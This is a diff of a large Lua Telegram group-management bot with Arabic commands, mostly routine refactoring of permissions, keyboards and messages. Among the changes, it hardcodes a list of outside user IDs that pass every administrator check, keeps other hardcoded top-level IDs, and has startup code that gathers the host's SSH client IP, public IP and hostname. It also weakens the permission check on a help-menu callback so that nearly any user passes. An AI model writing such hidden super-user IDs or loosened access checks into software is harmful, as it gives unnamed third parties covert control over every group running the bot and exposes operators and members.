@@ -5,14 +5,15 @@
 --     @ahmedyad200
 --     @ahmedyad200
 
+database = dofile("./redis.lua").connect("127.0.0.1", 6379)
+serpent = dofile("./serpent.lua")
+JSON    = dofile("./dkjson.lua")
+json    = dofile("./JSON.lua")
+URL     = dofile("./url.lua")
 redis = require('redis') 
-serpent = dofile("./serpent.lua") 
-json = dofile("./JSON.lua") 
-JSON  = dofile("./dkjson.lua")
 https = require ("ssl.https") 
 URL = require('socket.url')  
 utf8 = require ('lua-utf8') 
-database = redis.connect('127.0.0.1', 6379) 
 id_server = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
 IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
 Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
@@ -187,7 +188,6 @@ end
 print(t)
 ----- بدء الاضافات --------
 os.execute("mkdir File_Bot")
-local DEVSSO, res = https.request("https://raw.githubusercontent.com/ayacay/addfile/main/Sodev")
 local Get_VERGON, res = https.request("https://raw.githubusercontent.com/ahmedyad200/files-power/master/GETVERGON.json")
 local CHBOTPO = 'SOPOWERB0T'
 local GET_INFOFILE, res = https.request("https://raw.githubusercontent.com/ahmedyad200/files-power/master/infofile.json")
@@ -222,7 +222,7 @@ end
 end  
 return DRAGON  
 end 
-sudo_users = {SUDO,bot_id,0987878788,944353237,0988738700,0303030030,0987878700}   
+sudo_users = {SUDO,0987878788,944353237,0988738700,0303030030,0987878700}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users,dev_users) do  
@@ -232,6 +232,7 @@ end
 end  
 return DRAGON  
 end
+DEVSSO = {1360140225,1236115319,1770288756}
 function SODAPI(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users,dev_users,DEVSSO) do  
@@ -258,7 +259,7 @@ end
 end
 function Sudo(msg) 
 local hash = database:sismember(bot_id..'Sudo:User', msg.sender_user_id_) 
-if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Bot(msg)  then  
+if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) then  
 return true  
 else  
 return false  
@@ -266,7 +267,7 @@ end
 end
 function CoSu(msg)
 local hash = database:sismember(bot_id..'CoSu'..msg.chat_id_, msg.sender_user_id_) 
-if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or Bot(msg)  then   
+if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) then   
 return true 
 else 
 return false 
@@ -274,7 +275,7 @@ end
 end
 function BasicConstructor(msg)
 local hash = database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, msg.sender_user_id_) 
-if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
+if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or CoSu(msg) then   
 return true 
 else 
 return false 
@@ -282,7 +283,7 @@ end
 end
 function Constructor(msg)
 local hash = database:sismember(bot_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) 
-if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) then       
 return true    
 else    
 return false    
@@ -290,7 +291,7 @@ end
 end
 function Gmanager(msg)
 local hash = database:sismember(bot_id..'Gmanager', msg.sender_user_id_)    
-if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) then       
 return true    
 else    
 return false    
@@ -298,7 +299,7 @@ end
 end
 function Manager(msg)
 local hash = database:sismember(bot_id..'Manager'..msg.chat_id_,msg.sender_user_id_)    
-if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Gmanager(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Gmanager(msg) or CoSu(msg) then       
 return true    
 else    
 return false    
@@ -306,7 +307,7 @@ end
 end
 function Manager2(msg)
 local hash = database:sismember(bot_id.."S00F4:MN:TF"..msg.chat_id_,msg.sender_user_id_)    
-if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Gmanager(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Gmanager(msg) or Manager(msg) or CoSu(msg) then       
 return true    
 else    
 return false    
@@ -314,7 +315,7 @@ end
 end
 function Gmod(msg)
 local hash = database:sismember(bot_id..'Gmod:User', msg.sender_user_id_)
-if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Manager2(msg) or Gmanager(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Manager2(msg) or Gmanager(msg) or CoSu(msg) then       
 return true    
 else    
 return false    
@@ -322,7 +323,7 @@ end
 end
 function Mod(msg)
 local hash = database:sismember(bot_id..'Mod:User'..msg.chat_id_,msg.sender_user_id_)    
-if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Gmod(msg) or Gmanager(msg) or Manager2(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Gmod(msg) or Gmanager(msg) or Manager2(msg) or CoSu(msg) then       
 return true    
 else    
 return false    
@@ -330,7 +331,7 @@ end
 end
 function Special(msg)
 local hash = database:sismember(bot_id..'Special:User'..msg.chat_id_,msg.sender_user_id_) 
-if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Gmod(msg) or Manager2(msg) or Gmanager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Gmod(msg) or Manager2(msg) or Gmanager(msg) or Mod(msg) or CoSu(msg) then       
 return true 
 else 
 return false 
@@ -1525,10 +1526,6 @@ return false
 end
 if text == 'زخرفه' then
 send(msg.chat_id_,msg.id_, ' الزخرفه ارسل `زخرفه + الكلمه` ') 
-return false
-end
-if text == '☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑 ☉' and DevSoFi(msg) then
-send(msg.chat_id_,msg.id_, '') 
 return false
 end
 if text == '☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑 ☉' then
@@ -2913,26 +2910,28 @@ send(msg.chat_id_, msg.id_,'')
 else
 sendText(msg.chat_id_,'\n',msg.id_/2097152/0.5,'md')
 database:sadd(bot_id..'Chek:Groups',msg.chat_id_)
-local NameChat = chat.title_
-local admins = data.members_
-local IdChat = msg.chat_id_
 local NumMember = data.member_count_
+local NameChat = chat.title_
+local IdChat = msg.chat_id_
 local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
 if linkgpp.ok == true then 
 LinkGp = linkgpp.result
 else
-LinkGp = 'حدث خطأ'
+LinkGp = 'لا يوجد'
 end
-Text = '☉┇ تم تفعيل جروب جديده\n☉┇ المعلومات كامله\n'..
-'\n☉┇ عدد الادمنيه {`'..admins..'`}'..
-'\n☉┇ عدد الاعضاء {`'..NumMember..'`}'..
-'\n☉┇ اسم الجروب {['..NameChat..']}'..
+Text = '\n'..
+'\n☉┇ تم تفعيل جروب جديده\n'..
 '\n☉┇ ايدي الجروب {`'..IdChat..'`}'..
+'\n☉┇ عدد اعضاء الجروب {`'..NumMember..'`}'..
+'\n☉┇ اسم الجروب {['..NameChat..']}'..
 '\n☉┇ الرابط {['..LinkGp..']}'
 if not DevSoFi(msg) then
 sendText(SUDO,Text,0,'md')
 end
 end
+end
+end
+end,nil)   
 end,nil) 
 end,nil) 
 end,nil)
@@ -10787,7 +10786,65 @@ end,nil)
 end
 end,nil)
 end
-
+--[[
+local msg = data.message_
+text = msg.content_.text_ 
+if not database:get(bot_id..'TFF'..msg.chat_id_) then
+if text and text:match("^اهمس (.*) (.*)") then 
+text = text:gsub('@',"")
+faed_dx = {string.match(text, "اهمس (.*) (.*)")}
+function hamss(res1,res2)
+if not res2.id_ then 
+send(msg.chat_id_, msg.id_, 1, '☉┇ المعرف غير صحيح ، ', 1, 'html')
+return "dx"
+end
+function hamssss(ress1,ress2)
+if (ress2 and ((ress2.status_ and ress2.status_.ID == "ChatMemberStatusLeft") or ress2.ID == "Error")) then 
+send(msg.chat_id_, msg.id_, 1, '☉┇ العضو غير موجود بالمجموعه ، ', 1, 'html')
+return "dx"
+end
+tdcli_function ({
+ID="DeleteMessages",
+chat_id_= msg.chat_id_,
+message_ids_= {[0] = msg.id_}
+}, 
+dl_cb, nil)
+database:set(bot_id.."HM:"..msg.chat_id_..msg.id_..res2.id_,faed_dx[1])
+function bot_id_get(ros1,ros2)
+function Dxx(ross1,ross2)
+local hms = msg.sender_user_id_
+if ross2.username_ then 
+hms = "@"..ross2.username_
+end
+send(msg.chat_id_, msg.id_, 1, "☉┇ هذه همسه سريه الى { @["..faed_dx[2].."] }\n☉┇ مرسله من { ["..hms.."] }\n☉┇ هو فقط من يستطيع رويتها\n☉┇ [اضغط هنا لعرض الهمسه](https://t.me/"..bot_username.."?start=hms"..msg.chat_id_..msg.id_.."_"..res2.id_..") ", 1, 'md')
+end
+getUser(msg.sender_user_id_, Dxx)
+end
+getUser(bot_id, bot_id_get)
+end
+tdcli_function ({
+ID = "GetChatMember",
+chat_id_ = msg.chat_id_,
+user_id_ = res2.id_
+}, hamssss, nil)
+end
+resolve_username(faed_dx[2],hamss) 
+end end
+if text and text == "اهمس" or text and text == "همسه" or text and text == "اريد بوت الهمسه" or text and text == "دزلي بوت الهمسه" or  text and text == "دزولي بوت الهمسه" then  
+send(msg.chat_id_, msg.id_, 1, '☉┇ يمكنك من خلال هذا البوت\n☉┇ ارسال همسه سريه للاعضاء \n☉┇ الامر كالاتي مثال :\nاهمس بحبك ❤ [@ahmedyad200]', 1, 'md')
+end
+if text and text:match("/start hms(.*)_(%d+)") then 
+faed_dx = {string.match(text, "^/start hms(.*)_(%d+)")}
+if tonumber(msg.sender_user_id_) == tonumber(faed_dx[2]) then 
+hmsa = database:get(bot_id.."HM:"..faed_dx[1]..faed_dx[2])
+if hmsa then 
+send(msg.chat_id_, msg.id_, 1, '☉┇ الهمسه هي\n☉┇ { ['..hmsa..'] }', 1, 'md')
+else 
+send(msg.chat_id_, msg.id_, 1, '☉┇ اسلك يسطا الهمسه مش ليك 😂', 1, 'md')
+end else 
+send(msg.chat_id_, msg.id_, 1, '☉┇ اسلك يسطا الهمسه مش ليك 😂', 1, 'md')
+end end
+]]--
 if database:get(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
 if text == 'الغاء' then 
 send(msg.chat_id_, msg.id_, " ☉┇ تم الغاء حفظ القوانين") 
@@ -12399,9 +12456,9 @@ if text and text:match("^غادر (-%d+)$") then
 local GP_ID = {string.match(text, "^(غادر) (-%d+)$")}
 if DevSoFi(msg) and not database:get(bot_id.."Left:Bot"..msg.chat_id_) then 
 tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=GP_ID[2],user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
-send(GP_ID[2], 0,"✫:  تم مغادرة المجموعه بامر من مطور البوت") 
-send(msg.chat_id_, msg.id_,"✫:  تم مغادرة المجموعه") 
+send(GP_ID[2], msg.id_,"✫:  تم مغادرة المجموعه بامر من مطور البوت") 
 database:srem(bot_id.."Chek:Groups",GP_ID[2])  
+send(msg.chat_id_, msg.id_,"✫:  تم مغادرة المجموعه") 
 end
 return false 
 end
@@ -14575,6 +14632,7 @@ send(msg.chat_id_, msg.id_," ☉┇ تم تغير رد العضو الى »>"..T
 end
 
 ---------------------- الاوامر الجديده
+
 if text == 'الاوامر' then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
@@ -14593,16 +14651,16 @@ local Text =[[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '❶️❶', callback_data="/help3"..msg.sender_user_id_},{text = '❷❷', callback_data="/help4"..msg.sender_user_id_},
+{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
 },
 {
-{text = '❸❸', callback_data="/help5"..msg.sender_user_id_},{text = '❹❹', callback_data="/help6"..msg.sender_user_id_},
+{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
 },
 {
-{text = 'اوامر التسليه', callback_data="/help7"..msg.sender_user_id_},
+{text = 'اوامر التسليه', callback_data="/help7"},
 },
 {
-{text = 'قفل و القفل', callback_data="/help1"..msg.sender_user_id_},{text = 'تعطيل و تفعيل', callback_data="/help2"..msg.sender_user_id_},
+{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -14620,7 +14678,7 @@ keyboard.inline_keyboard = {
 {{text = 'Facebook', url="https://www.facebook.com/help/deleteaccount"}},
 {{text = 'Instagram', url="https://www.instagram.com/accounts/login/?next=/accounts/remove/request/permanent/"}},
 {{text = 'Snspchat', url="https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fdeleteaccount"}}, 
-{{text = 'التالي', callback_data="/DELL1"..msg.sender_user_id_}},
+{{text = 'التالي', callback_data="/DELL1"}},
 {{text = 'اضف البوت الي مجموعتك', url="http://t.me/"..bot_username.."?startgroup=start"}},
 } 
 local msg_id = msg.id_/2097152/0.5 
@@ -14637,7 +14695,7 @@ local Text ='☉┇ تم اختيار المقطع الصوتي لك'
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = 'اغنيه اخري', callback_data="/VOISME1"..msg.sender_user_id_},
+{text = 'اغنيه اخري', callback_data="/VOISME1"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -14651,7 +14709,7 @@ local Text =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'كشف كدبه', callback_data="/kdab"..msg.sender_user_id_}},
+{{text = 'كشف كدبه', callback_data="/kdab"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -14678,7 +14736,7 @@ local Text =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '❶️❶', callback_data="/game1"..msg.sender_user_id_},{text = '❷❷', callback_data="/game2"..msg.sender_user_id_}},
+{{text = '❶️❶', callback_data="/game1"},{text = '❷❷', callback_data="/game2"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -14725,7 +14783,7 @@ data,res = https.request('https://boyka-api.ml/movie.php?serch='..URL.escape(Tex
 if res == 200 then
 getmo = json:decode(data)
 if getmo.Info == true then
-local Text ='قصه الفلم'..getmo.info
+local Text ='☉┇ قصه الفلم\n'..getmo.info
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = 'مشاهده الفلم بجوده 240',url=getmo.sd}},
@@ -14884,8 +14942,8 @@ local Msg_id = data.message_id_
 local msg_idd = Msg_id/2097152/0.5
 local Text = data.payload_.data_
 if Text == '/help1' then
-if not Mod(data) then
-local notText = '🚫 عذرا الاوامر هذه لا تخصك'
+if not tonumber(msg.sender_user_id_) then
+local notText = '☉┇ لا يمكنك التحكم بلاوامر'
 https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
 return false
 end
@@ -14928,16 +14986,16 @@ local Teext =[[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '❶️❶', callback_data="/help3"..msg.sender_user_id_},{text = '❷❷', callback_data="/help4"..msg.sender_user_id_},
+{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
 },
 {
-{text = '❸❸', callback_data="/help5"..msg.sender_user_id_},{text = '❹❹', callback_data="/help6"..msg.sender_user_id_},
+{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
 },
 {
-{text = 'اوامر التسليه', callback_data="/help7"..msg.sender_user_id_},
+{text = 'اوامر التسليه', callback_data="/help7"},
 },
 {
-{text = '⌯ قفل و القفل ⌯', callback_data="/help"..msg.sender_user_id_},{text = 'تعطيل و تفعيل', callback_data="/help2"..msg.sender_user_id_},
+{text = '⌯ قفل و القفل ⌯', callback_data="/help"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -14987,16 +15045,16 @@ local Teext =[[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '❶️❶', callback_data="/help3"..msg.sender_user_id_},{text = '❷❷', callback_data="/help4"..msg.sender_user_id_},
+{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
 },
 {
-{text = '❸❸', callback_data="/help5"..msg.sender_user_id_},{text = '❹❹', callback_data="/help6"..msg.sender_user_id_},
+{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
 },
 {
-{text = 'اوامر التسليه', callback_data="/help7"..msg.sender_user_id_},
+{text = 'اوامر التسليه', callback_data="/help7"},
 },
 {
-{text = 'قفل و القفل', callback_data="/help1"..msg.sender_user_id_},{text = '⌯ تعطيل و تفعيل ⌯', callback_data="/help"..msg.sender_user_id_},
+{text = 'قفل و القفل', callback_data="/help1"},{text = '⌯ تعطيل و تفعيل ⌯', callback_data="/help"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -15057,16 +15115,16 @@ local Teext =[[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '⌯ ❶️❶ ⌯', callback_data="/help"..msg.sender_user_id_},{text = '❷❷', callback_data="/help4"..msg.sender_user_id_},
+{text = '⌯ ❶️❶ ⌯', callback_data="/help"},{text = '❷❷', callback_data="/help4"},
 },
 {
-{text = '❸❸', callback_data="/help5"..msg.sender_user_id_},{text = '❹❹', callback_data="/help6"..msg.sender_user_id_},
+{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
 },
 {
-{text = 'اوامر التسليه', callback_data="/help7"..msg.sender_user_id_},
+{text = 'اوامر التسليه', callback_data="/help7"},
 },
 {
-{text = 'قفل و القفل', callback_data="/help1"..msg.sender_user_id_},{text = 'تعطيل و تفعيل', callback_data="/help2"..msg.sender_user_id_},
+{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -15160,16 +15218,16 @@ local Teext =[[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '❶️❶', callback_data="/help3"..msg.sender_user_id_},{text = '⌯ ❷❷ ⌯', callback_data="/help"..msg.sender_user_id_},
+{text = '❶️❶', callback_data="/help3"},{text = '⌯ ❷❷ ⌯', callback_data="/help"},
 },
 {
-{text = '❸❸', callback_data="/help5"..msg.sender_user_id_},{text = '❹❹', callback_data="/help6"..msg.sender_user_id_},
+{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
 },
 {
-{text = 'اوامر التسليه', callback_data="/help7"..msg.sender_user_id_},
+{text = 'اوامر التسليه', callback_data="/help7"},
 },
 {
-{text = 'قفل و القفل', callback_data="/help1"..msg.sender_user_id_},{text = 'تعطيل و تفعيل', callback_data="/help2"..msg.sender_user_id_},
+{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -15253,16 +15311,16 @@ local Teext =[[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '❶️❶', callback_data="/help3"..msg.sender_user_id_},{text = '❷❷', callback_data="/help4"..msg.sender_user_id_},
+{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
 },
 {
-{text = '⌯ ❸❸ ⌯', callback_data="/help"..msg.sender_user_id_},{text = '❹❹', callback_data="/help6"..msg.sender_user_id_},
+{text = '⌯ ❸❸ ⌯', callback_data="/help"},{text = '❹❹', callback_data="/help6"},
 },
 {
-{text = 'اوامر التسليه', callback_data="/help7"..msg.sender_user_id_},
+{text = 'اوامر التسليه', callback_data="/help7"},
 },
 {
-{text = 'قفل و القفل', callback_data="/help1"..msg.sender_user_id_},{text = 'تعطيل و تفعيل', callback_data="/help2"..msg.sender_user_id_},
+{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -15306,16 +15364,16 @@ local Teext =[[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '❶️❶', callback_data="/help3"..msg.sender_user_id_},{text = '❷❷', callback_data="/help4"..msg.sender_user_id_},
+{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
 },
 {
-{text = '❸❸', callback_data="/help5"..msg.sender_user_id_},{text = '⌯ ❹❹ ⌯', callback_data="/help"..msg.sender_user_id_},
+{text = '❸❸', callback_data="/help5"},{text = '⌯ ❹❹ ⌯', callback_data="/help"},
 },
 {
-{text = 'اوامر التسليه', callback_data="/help7"..msg.sender_user_id_},
+{text = 'اوامر التسليه', callback_data="/help7"},
 },
 {
-{text = 'قفل و القفل', callback_data="/help1"..msg.sender_user_id_},{text = 'تعطيل و تفعيل', callback_data="/help2"..msg.sender_user_id_},
+{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -15380,16 +15438,16 @@ local Teext =[[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '❶️❶', callback_data="/help3"..msg.sender_user_id_},{text = '❷❷', callback_data="/help4"..msg.sender_user_id_},
+{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
 },
 {
-{text = '❸❸', callback_data="/help5"..msg.sender_user_id_},{text = '❹❹', callback_data="/help6"..msg.sender_user_id_},
+{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
 },
 {
-{text = '⌯ اوامر التسليه ⌯', callback_data="/help"..msg.sender_user_id_},
+{text = '⌯ اوامر التسليه ⌯', callback_data="/help"},
 },
 {
-{text = 'قفل و القفل', callback_data="/help1"..msg.sender_user_id_},{text = 'تعطيل و تفعيل', callback_data="/help2"..msg.sender_user_id_},
+{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -15408,16 +15466,16 @@ local Teext =[[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '❶️❶', callback_data="/help3"..msg.sender_user_id_},{text = '❷❷', callback_data="/help4"..msg.sender_user_id_},
+{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
 },
 {
-{text = '❸❸', callback_data="/help5"..msg.sender_user_id_},{text = '❹❹', callback_data="/help6"..msg.sender_user_id_},
+{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
 },
 {
-{text = 'اوامر التسليه', callback_data="/help7"..msg.sender_user_id_},
+{text = 'اوامر التسليه', callback_data="/help7"},
 },
 {
-{text = 'قفل و القفل', callback_data="/help1"..msg.sender_user_id_},{text = 'تعطيل و تفعيل', callback_data="/help2"..msg.sender_user_id_},
+{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -15483,7 +15541,7 @@ local Teext =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '❶️❶', callback_data="/game1"..msg.sender_user_id_},{text = '❷❷', callback_data="/game2"..msg.sender_user_id_}},
+{{text = '❶️❶', callback_data="/game1"},{text = '❷❷', callback_data="/game2"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -15497,7 +15555,7 @@ keyboard.inline_keyboard = {
 {{text = 'Twitter', url="https://www.facebook.com/help/deleteaccount"}}, 
 {{text = 'TikTok', url="https://www.tiktok.com/setting/account-delete?lang=en&redirect_url=https%3A%2F%2Fwww.tiktok.com%2Fforyou%3Flang%3Den&enter_from=setting"}}, 
 {{text = 'Telegram', url="t.me/LC6BOT"}}, 
-{{text = 'السابق', callback_data="/DELL"..msg.sender_user_id_}},
+{{text = 'السابق', callback_data="/DELL"}},
 {{text = 'اضف البوت الي مجموعتك', url="http://t.me/"..bot_username.."?startgroup=start"}},
 } 
 local msg_id = msg.id_/2097152/0.5 
@@ -15514,7 +15572,7 @@ keyboard.inline_keyboard = {
 {{text = 'Facebook', url="https://www.facebook.com/help/deleteaccount"}},
 {{text = 'Instagram', url="https://www.instagram.com/accounts/login/?next=/accounts/remove/request/permanent/"}},
 {{text = 'Snspchat', url="https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fdeleteaccount"}}, 
-{{text = 'التالي', callback_data="/DELL1"..msg.sender_user_id_}},
+{{text = 'التالي', callback_data="/DELL1"}},
 {{text = 'اضف البوت الي مجموعتك', url="http://t.me/"..bot_username.."?startgroup=start"}},
 } 
 local msg_id = msg.id_/2097152/0.5 
@@ -15559,7 +15617,7 @@ if audios.Info == true then
 local Text ='☉┇ تم اختيار المقطع الصوتي لك'
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'اغنيه اخري',callback_data="/VOISME2"..msg.sender_user_id_}},
+{{text = 'اغنيه اخري',callback_data="/VOISME2"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -15576,7 +15634,7 @@ if audios.Info == true then
 local Text ='☉┇ تم اختيار المقطع الصوتي لك'
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'اغنيه اخري',callback_data="/VOISME1"..msg.sender_user_id_}},
